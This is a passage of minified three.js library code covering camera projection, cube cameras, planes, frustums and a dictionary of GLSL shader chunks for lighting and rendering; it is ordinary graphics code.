Ht.prototype.copy.call(this,e,t),this.fov=e.fov,this.zoom=e.zoom,this.near=e.near,this.far=e.far,this.focus=e.focus,this.aspect=e.aspect,this.view=null===e.view?null:Object.assign({},e.view),this.filmGauge=e.filmGauge,this.filmOffset=e.filmOffset,this},setFocalLength:function(e){var t=.5*this.getFilmHeight()/e;this.fov=2*p.RAD2DEG*Math.atan(t),this.updateProjectionMatrix()},getFocalLength:function(){var e=Math.tan(.5*p.DEG2RAD*this.fov);return.5*this.getFilmHeight()/e},getEffectiveFOV:function(){return 2*p.RAD2DEG*Math.atan(Math.tan(.5*p.DEG2RAD*this.fov)/this.zoom)},getFilmWidth:function(){return this.filmGauge*Math.min(this.aspect,1)},getFilmHeight:function(){return this.filmGauge/Math.max(this.aspect,1)},setViewOffset:function(e,t,i,n,r,o){this.aspect=e/t,null===this.view&&(this.view={enabled:!0,fullWidth:1,fullHeight:1,offsetX:0,offsetY:0,width:1,height:1}),this.view.enabled=!0,this.view.fullWidth=e,this.view.fullHeight=t,this.view.offsetX=i,this.view.offsetY=n,this.view.width=r,this.view.height=o,this.updateProjectionMatrix()},clearViewOffset:function(){null!==this.view&&(this.view.enabled=!1),this.updateProjectionMatrix()},updateProjectionMatrix:function(){var e=this.near,t=e*Math.tan(.5*p.DEG2RAD*this.fov)/this.zoom,i=2*t,n=this.aspect*i,r=-.5*n,o=this.view;if(null!==this.view&&this.view.enabled){var a=o.fullWidth,s=o.fullHeight;r+=o.offsetX*n/a,t-=o.offsetY*i/s,n*=o.width/a,i*=o.height/s}var c=this.filmOffset;0!==c&&(r+=e*c/this.getFilmWidth()),this.projectionMatrix.makePerspective(r,r+n,t,t-i,e,this.far),this.projectionMatrixInverse.getInverse(this.projectionMatrix)},toJSON:function(e){var t=K.prototype.toJSON.call(this,e);return t.object.fov=this.fov,t.object.zoom=this.zoom,t.object.near=this.near,t.object.far=this.far,t.object.focus=this.focus,t.object.aspect=this.aspect,null!==this.view&&(t.object.view=Object.assign({},this.view)),t.object.filmGauge=this.filmGauge,t.object.filmOffset=this.filmOffset,t}});function Wt(e,t,i,n){K.call(this),this.type="CubeCamera";var r=new Gt(90,1,e,t);r.up.set(0,-1,0),r.lookAt(new y(1,0,0)),this.add(r);var o=new Gt(90,1,e,t);o.up.set(0,-1,0),o.lookAt(new y(-1,0,0)),this.add(o);var a=new Gt(90,1,e,t);a.up.set(0,0,1),a.lookAt(new y(0,1,0)),this.add(a);var s=new Gt(90,1,e,t);s.up.set(0,0,-1),s.lookAt(new y(0,-1,0)),this.add(s);var c=new Gt(90,1,e,t);c.up.set(0,-1,0),c.lookAt(new y(0,0,1)),this.add(c);var l=new Gt(90,1,e,t);l.up.set(0,-1,0),l.lookAt(new y(0,0,-1)),this.add(l),n=n||{format:1022,magFilter:1006,minFilter:1006},this.renderTarget=new qt(i,i,n),this.renderTarget.texture.name="CubeCamera",this.update=function(e,t){null===this.parent&&this.updateMatrixWorld();var i=e.getRenderTarget(),n=this.renderTarget,h=n.texture.generateMipmaps;n.texture.generateMipmaps=!1,e.setRenderTarget(n,0),e.render(t,r),e.setRenderTarget(n,1),e.render(t,o),e.setRenderTarget(n,2),e.render(t,a),e.setRenderTarget(n,3),e.render(t,s),e.setRenderTarget(n,4),e.render(t,c),n.texture.generateMipmaps=h,e.setRenderTarget(n,5),e.render(t,l),e.setRenderTarget(i)},this.clear=function(e,t,i,n){for(var r=e.getRenderTarget(),o=this.renderTarget,a=0;a<6;a++)e.setRenderTarget(o,a),e.clear(t,i,n);e.setRenderTarget(r)}}function qt(e,t,i){E.call(this,e,t,i)}function Xt(e,t,i,n,r,o,a,s,c,l,h,u){S.call(this,null,o,a,s,c,l,n,r,h,u),this.image={data:e||null,width:t||1,height:i||1},this.magFilter=void 0!==c?c:1003,this.minFilter=void 0!==l?l:1003,this.generateMipmaps=!1,this.flipY=!1,this.unpackAlignment=1,this.needsUpdate=!0}Wt.prototype=Object.create(K.prototype),Wt.prototype.constructor=Wt,qt.prototype=Object.create(E.prototype),qt.prototype.constructor=qt,qt.prototype.isWebGLRenderTargetCube=!0,qt.prototype.fromEquirectangularTexture=function(e,t){this.texture.type=t.type,this.texture.format=t.format,this.texture.encoding=t.encoding;var i=new ee,n={uniforms:{tEquirect:{value:null}},vertexShader:["varying vec3 vWorldDirection;","vec3 transformDirection( in vec3 dir, in mat4 matrix ) {","\treturn normalize( ( matrix * vec4( dir, 0.0 ) ).xyz );","}","void main() {","\tvWorldDirection = transformDirection( position, modelMatrix );","\t#include <begin_vertex>","\t#include <project_vertex>","}"].join("\n"),fragmentShader:["uniform sampler2D tEquirect;","varying vec3 vWorldDirection;","#define RECIPROCAL_PI 0.31830988618","#define RECIPROCAL_PI2 0.15915494","void main() {","\tvec3 direction = normalize( vWorldDirection );","\tvec2 sampleUV;","\tsampleUV.y = asin( clamp( direction.y, - 1.0, 1.0 ) ) * RECIPROCAL_PI + 0.5;","\tsampleUV.x = atan( direction.z, direction.x ) * RECIPROCAL_PI2 + 0.5;","\tgl_FragColor = texture2D( tEquirect, sampleUV );","}"].join("\n")},r=new Vt({type:"CubemapFromEquirect",uniforms:Nt(n.uniforms),vertexShader:n.vertexShader,fragmentShader:n.fragmentShader,side:1,blending:0});r.uniforms.tEquirect.value=t;var o=new Lt(new Ft(5,5,5),r);i.add(o);var a=new Wt(1,10,1);return a.renderTarget=this,a.renderTarget.texture.name="CubeCameraTexture",a.update(e,i),o.geometry.dispose(),o.material.dispose(),this},Xt.prototype=Object.create(S.prototype),Xt.prototype.constructor=Xt,Xt.prototype.isDataTexture=!0;var Yt=new y,Zt=new y,Qt=new x;function $t(e,t){this.normal=void 0!==e?e:new y(1,0,0),this.constant=void 0!==t?t:0}Object.assign($t.prototype,{isPlane:!0,set:function(e,t){return this.normal.copy(e),this.constant=t,this},setComponents:function(e,t,i,n){return this.normal.set(e,t,i),this.constant=n,this},setFromNormalAndCoplanarPoint:function(e,t){return this.normal.copy(e),this.constant=-t.dot(this.normal),this},setFromCoplanarPoints:function(e,t,i){var n=Yt.subVectors(i,t).cross(Zt.subVectors(e,t)).normalize();return this.setFromNormalAndCoplanarPoint(n,e),this},clone:function(){return(new this.constructor).copy(this)},copy:function(e){return this.normal.copy(e.normal),this.constant=e.constant,this},normalize:function(){var e=1/this.normal.length();return this.normal.multiplyScalar(e),this.constant*=e,this},negate:function(){return this.constant*=-1,this.normal.negate(),this},distanceToPoint:function(e){return this.normal.dot(e)+this.constant},distanceToSphere:function(e){return this.distanceToPoint(e.center)-e.radius},projectPoint:function(e,t){return void 0===t&&(console.warn("THREE.Plane: .projectPoint() target is now required"),t=new y),t.copy(this.normal).multiplyScalar(-this.distanceToPoint(e)).add(e)},intersectLine:function(e,t){void 0===t&&(console.warn("THREE.Plane: .intersectLine() target is now required"),t=new y);var i=e.delta(Yt),n=this.normal.dot(i);if(0===n)return 0===this.distanceToPoint(e.start)?t.copy(e.start):void 0;var r=-(e.start.dot(this.normal)+this.constant)/n;return r<0||r>1?void 0:t.copy(i).multiplyScalar(r).add(e.start)},intersectsLine:function(e){var t=this.distanceToPoint(e.start),i=this.distanceToPoint(e.end);return t<0&&i>0||i<0&&t>0},intersectsBox:function(e){return e.intersectsPlane(this)},intersectsSphere:function(e){return e.intersectsPlane(this)},coplanarPoint:function(e){return void 0===e&&(console.warn("THREE.Plane: .coplanarPoint() target is now required"),e=new y),e.copy(this.normal).multiplyScalar(-this.constant)},applyMatrix4:function(e,t){var i=t||Qt.getNormalMatrix(e),n=this.coplanarPoint(Yt).applyMatrix4(e),r=this.normal.applyMatrix3(i).normalize();return this.constant=-n.dot(r),this},translate:function(e){return this.constant-=e.dot(this.normal),this},equals:function(e){return e.normal.equals(this.normal)&&e.constant===this.constant}});var Jt=new ve,Kt=new y;function ei(e,t,i,n,r,o){this.planes=[void 0!==e?e:new $t,void 0!==t?t:new $t,void 0!==i?i:new $t,void 0!==n?n:new $t,void 0!==r?r:new $t,void 0!==o?o:new $t]}Object.assign(ei.prototype,{set:function(e,t,i,n,r,o){var a=this.planes;return a[0].copy(e),a[1].copy(t),a[2].copy(i),a[3].copy(n),a[4].copy(r),a[5].copy(o),this},clone:function(){return(new this.constructor).copy(this)},copy:function(e){for(var t=this.planes,i=0;i<6;i++)t[i].copy(e.planes[i]);return this},setFromMatrix:function(e){var t=this.planes,i=e.elements,n=i[0],r=i[1],o=i[2],a=i[3],s=i[4],c=i[5],l=i[6],h=i[7],u=i[8],d=i[9],p=i[10],f=i[11],m=i[12],v=i[13],g=i[14],y=i[15];return t[0].setComponents(a-n,h-s,f-u,y-m).normalize(),t[1].setComponents(a+n,h+s,f+u,y+m).normalize(),t[2].setComponents(a+r,h+c,f+d,y+v).normalize(),t[3].setComponents(a-r,h-c,f-d,y-v).normalize(),t[4].setComponents(a-o,h-l,f-p,y-g).normalize(),t[5].setComponents(a+o,h+l,f+p,y+g).normalize(),this},intersectsObject:function(e){var t=e.geometry;return null===t.boundingSphere&&t.computeBoundingSphere(),Jt.copy(t.boundingSphere).applyMatrix4(e.matrixWorld),this.intersectsSphere(Jt)},intersectsSprite:function(e){return Jt.center.set(0,0,0),Jt.radius=.7071067811865476,Jt.applyMatrix4(e.matrixWorld),this.intersectsSphere(Jt)},intersectsSphere:function(e){for(var t=this.planes,i=e.center,n=-e.radius,r=0;r<6;r++){if(t[r].distanceToPoint(i)<n)return!1}return!0},intersectsBox:function(e){for(var t=this.planes,i=0;i<6;i++){var n=t[i];if(Kt.x=n.normal.x>0?e.max.x:e.min.x,Kt.y=n.normal.y>0?e.max.y:e.min.y,Kt.z=n.normal.z>0?e.max.z:e.min.z,n.distanceToPoint(Kt)<0)return!1}return!0},containsPoint:function(e){for(var t=this.planes,i=0;i<6;i++)if(t[i].distanceToPoint(e)<0)return!1;return!0}});var ti={alphamap_fragment:"#ifdef USE_ALPHAMAP\n\tdiffuseColor.a *= texture2D( alphaMap, vUv ).g;\n#endif",alphamap_pars_fragment:"#ifdef USE_ALPHAMAP\n\tuniform sampler2D alphaMap;\n#endif",alphatest_fragment:"#ifdef ALPHATEST\n\tif ( diffuseColor.a < ALPHATEST ) discard;\n#endif",aomap_fragment:"#ifdef USE_AOMAP\n\tfloat ambientOcclusion = ( texture2D( aoMap, vUv2 ).r - 1.0 ) * aoMapIntensity + 1.0;\n\treflectedLight.indirectDiffuse *= ambientOcclusion;\n\t#if defined( USE_ENVMAP ) && defined( STANDARD )\n\t\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\n\t\treflectedLight.indirectSpecular *= computeSpecularOcclusion( dotNV, ambientOcclusion, material.specularRoughness );\n\t#endif\n#endif",aomap_pars_fragment:"#ifdef USE_AOMAP\n\tuniform sampler2D aoMap;\n\tuniform float aoMapIntensity;\n#endif",begin_vertex:"vec3 transformed = vec3( position );",beginnormal_vertex:"vec3 objectNormal = vec3( normal );\n#ifdef USE_TANGENT\n\tvec3 objectTangent = vec3( tangent.xyz );\n#endif",bsdfs:"vec2 integrateSpecularBRDF( const in float dotNV, const in float roughness ) {\n\tconst vec4 c0 = vec4( - 1, - 0.0275, - 0.572, 0.022 );\n\tconst vec4 c1 = vec4( 1, 0.0425, 1.04, - 0.04 );\n\tvec4 r = roughness * c0 + c1;\n\tfloat a004 = min( r.x * r.x, exp2( - 9.28 * dotNV ) ) * r.x + r.y;\n\treturn vec2( -1.04, 1.04 ) * a004 + r.zw;\n}\nfloat punctualLightIntensityToIrradianceFactor( const in float lightDistance, const in float cutoffDistance, const in float decayExponent ) {\n#if defined ( PHYSICALLY_CORRECT_LIGHTS )\n\tfloat distanceFalloff = 1.0 / max( pow( lightDistance, decayExponent ), 0.01 );\n\tif( cutoffDistance > 0.0 ) {\n\t\tdistanceFalloff *= pow2( saturate( 1.0 - pow4( lightDistance / cutoffDistance ) ) );\n\t}\n\treturn distanceFalloff;\n#else\n\tif( cutoffDistance > 0.0 && decayExponent > 0.0 ) {\n\t\treturn pow( saturate( -lightDistance / cutoffDistance + 1.0 ), decayExponent );\n\t}\n\treturn 1.0;\n#endif\n}\nvec3 BRDF_Diffuse_Lambert( const in vec3 diffuseColor ) {\n\treturn RECIPROCAL_PI * diffuseColor;\n}\nvec3 F_Schlick( const in vec3 specularColor, const in float dotLH ) {\n\tfloat fresnel = exp2( ( -5.55473 * dotLH - 6.98316 ) * dotLH );\n\treturn ( 1.0 - specularColor ) * fresnel + specularColor;\n}\nvec3 F_Schlick_RoughnessDependent( const in vec3 F0, const in float dotNV, const in float roughness ) {\n\tfloat fresnel = exp2( ( -5.55473 * dotNV - 6.98316 ) * dotNV );\n\tvec3 Fr = max( vec3( 1.0 - roughness ), F0 ) - F0;\n\treturn Fr * fresnel + F0;\n}\nfloat G_GGX_Smith( const in float alpha, const in float dotNL, const in float dotNV ) {\n\tfloat a2 = pow2( alpha );\n\tfloat gl = dotNL + sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );\n\tfloat gv = dotNV + sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );\n\treturn 1.0 / ( gl * gv );\n}\nfloat G_GGX_SmithCorrelated( const in float alpha, const in float dotNL, const in float dotNV ) {\n\tfloat a2 = pow2( alpha );\n\tfloat gv = dotNL * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );\n\tfloat gl = dotNV * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );\n\treturn 0.5 / max( gv + gl, EPSILON );\n}\nfloat D_GGX( const in float alpha, const in float dotNH ) {\n\tfloat a2 = pow2( alpha );\n\tfloat denom = pow2( dotNH ) * ( a2 - 1.0 ) + 1.0;\n\treturn RECIPROCAL_PI * a2 / pow2( denom );\n}\nvec3 BRDF_Specular_GGX( const in IncidentLight incidentLight, const in vec3 viewDir, const in vec3 normal, const in vec3 specularColor, const in float roughness ) {\n\tfloat alpha = pow2( roughness );\n\tvec3 halfDir = normalize( incidentLight.direction + viewDir );\n\tfloat dotNL = saturate( dot( normal, incidentLight.direction ) );\n\tfloat dotNV = saturate( dot( normal, viewDir ) );\n\tfloat dotNH = saturate( dot( normal, halfDir ) );\n\tfloat dotLH = saturate( dot( incidentLight.direction, halfDir ) );\n\tvec3 F = F_Schlick( specularColor, dotLH );\n\tfloat G = G_GGX_SmithCorrelated( alpha, dotNL, dotNV );\n\tfloat D = D_GGX( alpha, dotNH );\n\treturn F * ( G * D );\n}\nvec2 LTC_Uv( const in vec3 N, const in vec3 V, const in float roughness ) {\n\tconst float LUT_SIZE  = 64.0;\n\tconst float LUT_SCALE = ( LUT_SIZE - 1.0 ) / LUT_SIZE;\n\tconst float LUT_BIAS  = 0.5 / LUT_SIZE;\n\tfloat dotNV = saturate( dot( N, V ) );\n\tvec2 uv = vec2( roughness, sqrt( 1.0 - dotNV ) );\n\tuv = uv * LUT_SCALE + LUT_BIAS;\n\treturn uv;\n}\nfloat LTC_ClippedSphereFormFactor( const in vec3 f ) {\n\tfloat l = length( f );\n\treturn max( ( l * l + f.z ) / ( l + 1.0 ), 0.0 );\n}\nvec3 LTC_EdgeVectorFormFactor( const in vec3 v1, const in vec3 v2 ) {\n\tfloat x = dot( v1, v2 );\n\tfloat y = abs( x );\n\tfloat a = 0.8543985 + ( 0.4965155 + 0.0145206 * y ) * y;\n\tfloat b = 3.4175940 + ( 4.1616724 + y ) * y;\n\tfloat v = a / b;\n\tfloat theta_sintheta = ( x > 0.0 ) ? v : 0.5 * inversesqrt( max( 1.0 - x * x, 1e-7 ) ) - v;\n\treturn cross( v1, v2 ) * theta_sintheta;\n}\nvec3 LTC_Evaluate( const in vec3 N, const in vec3 V, const in vec3 P, const in mat3 mInv, const in vec3 rectCoords[ 4 ] ) {\n\tvec3 v1 = rectCoords[ 1 ] - rectCoords[ 0 ];\n\tvec3 v2 = rectCoords[ 3 ] - rectCoords[ 0 ];\n\tvec3 lightNormal = cross( v1, v2 );\n\tif( dot( lightNormal, P - rectCoords[ 0 ] ) < 0.0 ) return vec3( 0.0 );\n\tvec3 T1, T2;\n\tT1 = normalize( V - N * dot( V, N ) );\n\tT2 = - cross( N, T1 );\n\tmat3 mat = mInv * transposeMat3( mat3( T1, T2, N ) );\n\tvec3 coords[ 4 ];\n\tcoords[ 0 ] = mat * ( rectCoords[ 0 ] - P );\n\tcoords[ 1 ] = mat * ( rectCoords[ 1 ] - P );\n\tcoords[ 2 ] = mat * ( rectCoords[ 2 ] - P );\n\tcoords[ 3 ] = mat * ( rectCoords[ 3 ] - P );\n\tcoords[ 0 ] = normalize( coords[ 0 ] );\n\tcoords[ 1 ] = normalize( coords[ 1 ] );\n\tcoords[ 2 ] = normalize( coords[ 2 ] );\n\tcoords[ 3 ] = normalize( coords[ 3 ] );\n\tvec3 vectorFormFactor = vec3( 0.0 );\n\tvectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 0 ], coords[ 1 ] );\n\tvectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 1 ], coords[ 2 ] );\n\tvectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 2 ], coords[ 3 ] );\n\tvectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 3 ], coords[ 0 ] );\n\tfloat result = LTC_ClippedSphereFormFactor( vectorFormFactor );\n\treturn vec3( result );\n}\nvec3 BRDF_Specular_GGX_Environment( const in vec3 viewDir, const in vec3 normal, const in vec3 specularColor, const in float roughness ) {\n\tfloat dotNV = saturate( dot( normal, viewDir ) );\n\tvec2 brdf = integrateSpecularBRDF( dotNV, roughness );\n\treturn specularColor * brdf.x + brdf.y;\n}\nvoid BRDF_Specular_Multiscattering_Environment( const in GeometricContext geometry, const in vec3 specularColor, const in float roughness, inout vec3 singleScatter, inout vec3 multiScatter ) {\n\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\n\tvec3 F = F_Schlick_RoughnessDependent( specularColor, dotNV, roughness );\n\tvec2 brdf = integrateSpecularBRDF( dotNV, roughness );\n\tvec3 FssEss = F * brdf.x + brdf.y;\n\tfloat Ess = brdf.x + brdf.y;\n\tfloat Ems = 1.0 - Ess;\n\tvec3 Favg = specularColor + ( 1.0 - specularColor ) * 0.047619;\tvec3 Fms = FssEss * Favg / ( 1.0 - Ems * Favg );\n\tsingleScatter += FssEss;\n\tmultiScatter += Fms * Ems;\n}\nfloat G_BlinnPhong_Implicit( ) {\n\treturn 0.25;\n}\nfloat D_BlinnPhong( const in float shininess, const in float dotNH ) {\n\treturn RECIPROCAL_PI * ( shininess * 0.5 + 1.0 ) * pow( dotNH, shininess );\n}\nvec3 BRDF_Specular_BlinnPhong( const in IncidentLight incidentLight, const in GeometricContext geometry, const in vec3 specularColor, const in float shininess ) {\n\tvec3 halfDir = normalize( incidentLight.direction + geometry.viewDir );\n\tfloat dotNH = saturate( dot( geometry.normal, halfDir ) );\n\tfloat dotLH = saturate( dot( incidentLight.direction, halfDir ) );\n\tvec3 F = F_Schlick( specularColor, dotLH );\n\tfloat G = G_BlinnPhong_Implicit( );\n\tfloat D = D_BlinnPhong( shininess, dotNH );\n\treturn F * ( G * D );\n}\nfloat GGXRoughnessToBlinnExponent( const in float ggxRoughness ) {\n\treturn ( 2.0 / pow2( ggxRoughness + 0.0001 ) - 2.0 );\n}\nfloat BlinnExponentToGGXRoughness( const in float blinnExponent ) {\n\treturn sqrt( 2.0 / ( blinnExponent + 2.0 ) );\n}\n#if defined( USE_SHEEN )\nfloat D_Charlie(float roughness, float NoH) {\n\tfloat invAlpha  = 1.0 / roughness;\n\tfloat cos2h = NoH * NoH;\n\tfloat sin2h = max(1.0 - cos2h, 0.0078125);\treturn (2.0 + invAlpha) * pow(sin2h, invAlpha * 0.5) / (2.0 * PI);\n}\nfloat V_Neubelt(float NoV, float NoL) {\n\treturn saturate(1.0 / (4.0 * (NoL + NoV - NoL * NoV)));\n}\nvec3 BRDF_Specular_Sheen( const in float roughness, const in vec3 L, const in GeometricContext geometry, vec3 specularColor ) {\n\tvec3 N = geometry.normal;\n\tvec3 V = geometry.viewDir;\n\tvec3 H = normalize( V + L );\n\tfloat dotNH = saturate( dot( N, H ) );\n\treturn specularColor * D_Charlie( roughness, dotNH ) * V_Neubelt( dot(N, V), dot(N, L) );\n}\n#endif",bumpmap_pars_fragment:"#ifdef USE_BUMPMAP\n\tuniform sampler2D bumpMap;\n\tuniform float bumpScale;\n\tvec2 dHdxy_fwd() {\n\t\tvec2 dSTdx = dFdx( vUv );\n\t\tvec2 dSTdy = dFdy( vUv );\n\t\tfloat Hll = bumpScale * texture2D( bumpMap, vUv ).x;\n\t\tfloat dBx = bumpScale * texture2D( bumpMap, vUv + dSTdx ).x - Hll;\n\t\tfloat dBy = bumpScale * texture2D( bumpMap, vUv + dSTdy ).x - Hll;\n\t\treturn vec2( dBx, dBy );\n\t}\n\tvec3 perturbNormalArb( vec3 surf_pos, vec3 surf_norm, vec2 dHdxy ) {\n\t\tvec3 vSigmaX = vec3( dFdx( surf_pos.x ), dFdx( surf_pos.y ), dFdx( surf_pos.z ) );\n\t\tvec3 vSigmaY = vec3( dFdy( surf_pos.x ), dFdy( surf_pos.y ), dFdy( surf_pos.z ) );\n\t\tvec3 vN = surf_norm;\n\t\tvec3 R1 = cross( vSigmaY, vN );\n\t\tvec3 R2 = cross( vN, vSigmaX );\n\t\tfloat fDet = dot( vSigmaX, R1 );\n\t\tfDet *= ( float( gl_FrontFacing ) * 2.0 - 1.0 );\n\t\tvec3 vGrad = sign( fDet ) * ( dHdxy.x * R1 + dHdxy.y * R2 );\n\t\treturn normalize( abs( fDet ) * surf_norm - vGrad );\n\t}\n#endif",clipping_planes_fragment:"#if NUM_CLIPPING_PLANES > 0\n\tvec4 plane;\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < UNION_CLIPPING_PLANES; i ++ ) {\n\t\tplane = clippingPlanes[ i ];\n\t\tif ( dot( vViewPosition, plane.xyz ) > plane.w ) discard;\n\t}\n\t#if UNION_CLIPPING_PLANES < NUM_CLIPPING_PLANES\n\t\tbool clipped = true;\n\t\t#pragma unroll_loop\n\t\tfor ( int i = UNION_CLIPPING_PLANES; i < NUM_CLIPPING_PLANES; i ++ ) {\n\t\t\tplane = clippingPlanes[ i ];\n\t\t\tclipped = ( dot( vViewPosition, plane.xyz ) > plane.w ) && clipped;\n\t\t}\n\t\tif ( clipped ) discard;\n\t#endif\n#endif",clipping_planes_pars_fragment:"#if NUM_CLIPPING_PLANES > 0\n\t#if ! defined( STANDARD ) && ! defined( PHONG ) && ! defined( MATCAP )\n\t\tvarying vec3 vViewPosition;\n\t#endif\n\tuniform vec4 clippingPlanes[ NUM_CLIPPING_PLANES ];\n#endif",clipping_planes_pars_vertex:"#if NUM_CLIPPING_PLANES > 0 && ! defined( STANDARD ) && ! defined( PHONG ) && ! defined( MATCAP )\n\tvarying vec3 vViewPosition;\n#endif",clipping_planes_vertex:"#if NUM_CLIPPING_PLANES > 0 && ! defined( STANDARD ) && ! defined( PHONG ) && ! defined( MATCAP )\n\tvViewPosition = - mvPosition.xyz;\n#endif",color_fragment:"#ifdef USE_COLOR\n\tdiffuseColor.rgb *= vColor;\n#endif",color_pars_fragment:"#ifdef USE_COLOR\n\tvarying vec3 vColor;\n#endif",color_pars_vertex:"#ifdef USE_COLOR\n\tvarying vec3 vColor;\n#endif",color_vertex:"#ifdef USE_COLOR\n\tvColor.xyz = color.xyz;\n#endif",common:"#define PI 3.14159265359\n#define PI2 6.28318530718\n#define PI_HALF 1.5707963267949\n#define RECIPROCAL_PI 0.31830988618\n#define RECIPROCAL_PI2 0.15915494\n#define LOG2 1.442695\n#define EPSILON 1e-6\n#ifndef saturate\n#define saturate(a) clamp( a, 0.0, 1.0 )\n#endif\n#define whiteComplement(a) ( 1.0 - saturate( a ) )\nfloat pow2( const in float x ) { return x*x; }\nfloat pow3( const in float x ) { return x*x*x; }\nfloat pow4( const in float x ) { float x2 = x*x; return x2*x2; }\nfloat average( const in vec3 color ) { return dot( color, vec3( 0.3333 ) ); }\nhighp float rand( const in vec2 uv ) {\n\tconst highp float a = 12.9898, b = 78.233, c = 43758.5453;\n\thighp float dt = dot( uv.xy, vec2( a,b ) ), sn = mod( dt, PI );\n\treturn fract(sin(sn) * c);\n}\n#ifdef HIGH_PRECISION\n\tfloat precisionSafeLength( vec3 v ) { return length( v ); }\n#else\n\tfloat max3( vec3 v ) { return max( max( v.x, v.y ), v.z ); }\n\tfloat precisionSafeLength( vec3 v ) {\n\t\tfloat maxComponent = max3( abs( v ) );\n\t\treturn length( v / maxComponent ) * maxComponent;\n\t}\n#endif\nstruct IncidentLight {\n\tvec3 color;\n\tvec3 direction;\n\tbool visible;\n};\nstruct ReflectedLight {\n\tvec3 directDiffuse;\n\tvec3 directSpecular;\n\tvec3 indirectDiffuse;\n\tvec3 indirectSpecular;\n};\nstruct GeometricContext {\n\tvec3 position;\n\tvec3 normal;\n\tvec3 viewDir;\n#ifdef CLEARCOAT\n\tvec3 clearcoatNormal;\n#endif\n};\nvec3 transformDirection( in vec3 dir, in mat4 matrix ) {\n\treturn normalize( ( matrix * vec4( dir, 0.0 ) ).xyz );\n}\nvec3 inverseTransformDirection( in vec3 dir, in mat4 matrix ) {\n\treturn normalize( ( vec4( dir, 0.0 ) * matrix ).xyz );\n}\nvec3 projectOnPlane(in vec3 point, in vec3 pointOnPlane, in vec3 planeNormal ) {\n\tfloat distance = dot( planeNormal, point - pointOnPlane );\n\treturn - distance * planeNormal + point;\n}\nfloat sideOfPlane( in vec3 point, in vec3 pointOnPlane, in vec3 planeNormal ) {\n\treturn sign( dot( point - pointOnPlane, planeNormal ) );\n}\nvec3 linePlaneIntersect( in vec3 pointOnLine, in vec3 lineDirection, in vec3 pointOnPlane, in vec3 planeNormal ) {\n\treturn lineDirection * ( dot( planeNormal, pointOnPlane - pointOnLine ) / dot( planeNormal, lineDirection ) ) + pointOnLine;\n}\nmat3 transposeMat3( const in mat3 m ) {\n\tmat3 tmp;\n\ttmp[ 0 ] = vec3( m[ 0 ].x, m[ 1 ].x, m[ 2 ].x );\n\ttmp[ 1 ] = vec3( m[ 0 ].y, m[ 1 ].y, m[ 2 ].y );\n\ttmp[ 2 ] = vec3( m[ 0 ].z, m[ 1 ].z, m[ 2 ].z );\n\treturn tmp;\n}\nfloat linearToRelativeLuminance( const in vec3 color ) {\n\tvec3 weights = vec3( 0.2126, 0.7152, 0.0722 );\n\treturn dot( weights, color.rgb );\n}\nbool isPerspectiveMatrix( mat4 m ) {\n  return m[ 2 ][ 3 ] == - 1.0;\n}",cube_uv_reflection_fragment:"#ifdef ENVMAP_TYPE_CUBE_UV\n#define cubeUV_textureSize (1024.0)\nint getFaceFromDirection(vec3 direction) {\n\tvec3 absDirection = abs(direction);\n\tint face = -1;\n\tif( absDirection.x > absDirection.z ) {\n\t\tif(absDirection.x > absDirection.y )\n\t\t\tface = direction.x > 0.0 ? 0 : 3;\n\t\telse\n\t\t\tface = direction.y > 0.0 ? 1 : 4;\n\t}\n\telse {\n\t\tif(absDirection.z > absDirection.y )\n\t\t\tface = direction.z > 0.0 ? 2 : 5;\n\t\telse\n\t\t\tface = direction.y > 0.0 ? 1 : 4;\n\t}\n\treturn face;\n}\n#define cubeUV_maxLods1  (log2(cubeUV_textureSize*0.25) - 1.0)\n#define cubeUV_rangeClamp (exp2((6.0 - 1.0) * 2.0))\nvec2 MipLevelInfo( vec3 vec, float roughnessLevel, float roughness ) {\n\tfloat scale = exp2(cubeUV_maxLods1 - roughnessLevel);\n\tfloat dxRoughness = dFdx(roughness);\n\tfloat dyRoughness = dFdy(roughness);\n\tvec3 dx = dFdx( vec * scale * dxRoughness );\n\tvec3 dy = dFdy( vec * scale * dyRoughness );\n\tfloat d = max( dot( dx, dx ), dot( dy, dy ) );\n\td = clamp(d, 1.0, cubeUV_rangeClamp);\n\tfloat mipLevel = 0.5 * log2(d);\n\treturn vec2(floor(mipLevel), fract(mipLevel));\n}\n#define cubeUV_maxLods2 (log2(cubeUV_textureSize*0.25) - 2.0)\n#define cubeUV_rcpTextureSize (1.0 / cubeUV_textureSize)\nvec2 getCubeUV(vec3 direction, float roughnessLevel, float mipLevel) {\n\tmipLevel = roughnessLevel > cubeUV_maxLods2 - 3.0 ? 0.0 : mipLevel;\n\tfloat a = 16.0 * cubeUV_rcpTextureSize;\n\tvec2 exp2_packed = exp2( vec2( roughnessLevel, mipLevel ) );\n\tvec2 rcp_exp2_packed = vec2( 1.0 ) / exp2_packed;\n\tfloat powScale = exp2_packed.x * exp2_packed.y;\n\tfloat scale = rcp_exp2_packed.x * rcp_exp2_packed.y * 0.25;\n\tfloat mipOffset = 0.75*(1.0 - rcp_exp2_packed.y) * rcp_exp2_packed.x;\n\tbool bRes = mipLevel == 0.0;\n\tscale =  bRes && (scale < a) ? a : scale;\n\tvec3 r;\n\tvec2 offset;\n\tint face = getFaceFromDirection(direction);\n\tfloat rcpPowScale = 1.0 / powScale;\n\tif( face == 0) {\n\t\tr = vec3(direction.x, -direction.z, direction.y);\n\t\toffset = vec2(0.0+mipOffset,0.75 * rcpPowScale);\n\t\toffset.y = bRes && (offset.y < 2.0*a) ? a : offset.y;\n\t}\n\telse if( face == 1) {\n\t\tr = vec3(direction.y, direction.x, direction.z);\n\t\toffset = vec2(scale+mipOffset, 0.75 * rcpPowScale);\n\t\toffset.y = bRes && (offset.y < 2.0*a) ? a : offset.y;\n\t}\n\telse if( face == 2) {\n\t\tr = vec3(direction.z, direction.x, direction.y);\n\t\toffset = vec2(2.0*scale+mipOffset, 0.75 * rcpPowScale);\n\t\toffset.y = bRes && (offset.y < 2.0*a) ? a : offset.y;\n\t}\n\telse if( face == 3) {\n\t\tr = vec3(direction.x, direction.z, direction.y);\n\t\toffset 